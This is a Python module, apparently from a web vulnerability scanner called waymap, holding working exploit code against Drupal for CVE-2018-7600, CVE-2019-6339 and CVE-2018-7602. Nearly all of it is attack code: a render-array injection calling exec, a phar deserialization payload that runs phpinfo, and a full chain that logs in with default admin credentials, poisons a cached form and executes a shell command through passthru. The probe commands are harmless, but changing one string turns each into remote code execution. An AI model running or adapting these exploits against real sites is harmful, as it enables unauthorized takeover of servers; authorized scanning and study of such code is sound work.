# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# dp.py profile critical

from colorama import Fore, Style, init
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialization
init(autoreset=True)

# Color Configuration
class Color:
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]

# CVE-2018-7600 EXPLOIT STARTS
def scan_cve_2018_7600(profile_url):
    target_url = f"{profile_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
    data = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"}

    print(f"{Color.WARNING}[*] Testing if: {profile_url} is vulnerable{Color.END}")
    
    try:
        response = requests.post(target_url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and "haha" in response.text:
            print(f"{Color.RED}[!] The target {profile_url} is vulnerable to SA-CORE-2018-002 / CVE-2018-7600{Color.END}")
        else:
            print(f"{Color.OKGREEN}[*] - The target {profile_url} is not vulnerable{Color.END}")
    except Exception as e:
        print(f"{Color.RED}[!] - Something went wrong: {str(e)}{Color.END}")

# CVE-2019-6339 EXPLOIT STARTS
def scan_cve_2019_6339(profile_url):
    vuln_url = profile_url + "/phar.phar"
    payload = (
        b"\x47\x49\x46\x38\x39\x61"  
        b"<?php __HALT_COMPILER(); ?>"
        b'O:24:"GuzzleHttp\\Psr7\\FnStream":1:{s:9:"_fn_close";s:7:"phpinfo";}'
    )

    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/octet-stream",
        'Accept': "*/*",
        'Cache-Control': "no-cache"
    }

    try:
        response = requests.post(vuln_url, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            print(color_random[2] + "\n[+] Server is vulnerable to CVE-2019-6339. `phpinfo` executed.\n" + Color.END)
            print(color_random[3] + response.text + Color.END)
        else:
            print(color_random[4] + f"\n[!] No vulnerability detected. Status Code: {response.status_code}\n" + Color.END)
    except requests.RequestException as e:
        print(color_random[4] + "\n[!] An error occurred while sending the request.\n" + Color.END)
        print(color_random[3] + f"Error details: {str(e)}" + Color.END)

# CVE-2018-7602 EXPLOIT STARTS
def exploit_target_7602(profile_url):
    username = "admin"  
    password = "admin"  
    command = "id"     
    function = "passthru"  

    session = requests.Session()

    try:
        print(Color.OKGREEN + '[*] Initiating session with the provided credentials...' + Color.END)
        get_params = {'q': 'user/login'}
        post_params = {'form_id': 'user_login', 'name': username, 'pass': password, 'op': 'Log in'}
        
        login_response = session.post(profile_url, params=get_params, data=post_params, verify=False)
        if login_response.status_code != 200 or 'logout' not in login_response.text:
            print(Color.RED + "[-] Login failed. Exiting." + Color.END)
            return 
        
        get_params = {'q': 'user'}
        r = session.get(profile_url, params=get_params, verify=False)
        
        soup = BeautifulSoup(r.text, "html.parser")
        user_id_tag = soup.find('meta', {'property': 'foaf:name'})
        if not user_id_tag:
            print(Color.RED + "[-] Failed to retrieve User ID. Exiting." + Color.END)
            return  

        user_id = user_id_tag.get('about')
        if "?q=" in user_id:
            user_id = user_id.split("=")[1]

        if user_id:
            print(Color.OKGREEN + '[+] Successfully retrieved User ID: ' + user_id + Color.END)
        else:
            print(Color.RED + "[-] User ID extraction failed. Exiting." + Color.END)
            return  

        print(Color.OKGREEN + '[*] Poisoning the form using the `destination` variable and caching it...' + Color.END)
        get_params = {'q': user_id + '/cancel'}
        r = session.get(profile_url, params=get_params, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        
        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        if not form:
            print(Color.RED + "[-] Failed to find cancel form. Exiting." + Color.END)
            return 

        form_token = form.find('input', {'name': 'form_token'}).get('value')
        if not form_token:
            print(Color.RED + "[-] Failed to retrieve form token. Exiting." + Color.END)
            return 

        get_params = {
            'q': user_id + '/cancel',
            'destination': user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command
        }
        post_params = {'form_id': 'user_cancel_confirm_form', 'form_token': form_token, '_triggering_element_name': 'form_id', 'op': 'Cancel account'}
        r = session.post(profile_url, params=get_params, data=post_params, verify=False)
        
        soup = BeautifulSoup(r.text, "html.parser")
        form_build_id = soup.find('input', {'name': 'form_build_id'}).get('value')

        if form_build_id:
            print(Color.OKGREEN + '[+] Poisoned form with ID: ' + form_build_id + Color.END)
            print(Color.OKGREEN + '[*] Triggering the exploit to execute the command: ' + command + Color.END)
            
            get_params = {'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id}
            post_params = {'form_build_id': form_build_id}
            r = session.post(profile_url, params=get_params, data=post_params, verify=False)
            
            parsed_result = r.text.split('[{"command":"settings"')[0]
            print(parsed_result)
        else:
            print(Color.RED + "[-] Failed to retrieve form build ID. Exiting." + Color.END)

    except Exception as e:
        print(Color.RED + "[!] ERROR: Something went wrong during the exploit." + Color.END)
        print("Error details: %s" % str(e))

def scan_cve_2018_7602(profile_url):
    exploit_target_7602(profile_url)


def handle_cve_2019_6339(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2019_6339 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2019_6339(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2019_6339 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2019_6339 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2018_7602(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_7602 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2018_7602(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_7602 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_7602 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2018_7600(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_7600 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2018_7600(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_7600 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_7600 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return